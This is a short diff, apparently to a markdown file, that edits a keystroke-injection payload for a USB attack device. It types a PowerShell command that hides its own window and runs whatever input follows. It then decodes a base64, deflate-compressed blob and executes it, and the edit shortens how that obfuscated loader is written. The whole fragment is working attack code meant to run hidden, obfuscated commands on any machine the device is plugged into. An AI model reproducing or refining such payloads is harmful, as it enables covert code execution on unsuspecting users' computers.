@@ -46,7 +46,7 @@ ENTER
 STRING powershell -w hidden iex '(Add-Type n -pas -m ''[DllImport(\"user32\")]public static extern int ShowWindow(int h,int n);'')::ShowWindow((gps -Id $pid).MainWindowHandle,0);Read-Host|iex'
 ENTER
 DELAY 1000
-STRING Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('c8svUtBQybQ1sFZQyVTQzUlVMAKxtLU1Faq5FICguCSxqEQho6SkoNhKX7+8vFyvMr+0pDQpVS85P1e/PLEkOcO+zDYlsNyk3DI8PSI5kKuWq6g0LyUnx9hIL7UiVaG0OLUIyAQK6PjkJ2eH5xdlB5cklmTm53HxcgEA')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
+STRING sal n New-Object;iex $(n IO.StreamReader($(n IO.Compression.DeflateStream($(n IO.MemoryStream(,$([Convert]::FromBase64String('c8svUtBQybQ1sFZQyVTQzUlVMAKxtLU1Faq5FICguCSxqEQho6SkoNhKX7+8vFyvMr+0pDQpVS85P1e/PLEkOcO+zDYlsNyk3DI8PSI5kKuWq6g0LyUnx9hIL7UiVaG0OLUIyAQK6PjkJ2eH5xdlB5cklmTm53HxcgEA')))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd();
 ENTER
 ```
 
